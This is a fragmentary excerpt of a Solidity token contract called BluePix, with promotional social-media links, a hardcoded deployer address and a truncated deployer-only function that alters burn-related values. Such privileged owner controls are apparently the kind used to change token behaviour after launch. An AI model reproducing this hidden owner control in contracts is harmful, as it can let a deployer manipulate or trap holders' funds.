...
Telegram: https://t.me/BluePixETH
Twitter: https://twitter.com/BluePixETH
Website: https://bluepix.space
...
pragma solidity ^0.8.20;
    ...
    contract BluePix {
        string public constant name = "BluePix";  //
        string public constant symbol = "BLUEPIX";  //
        ...
        address payable constant deployer = payable(address(0x03Ac7027889c5EC744Bde040665Ec1150e4c50D1)); //
        ...
        function _setBLUEPIX(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
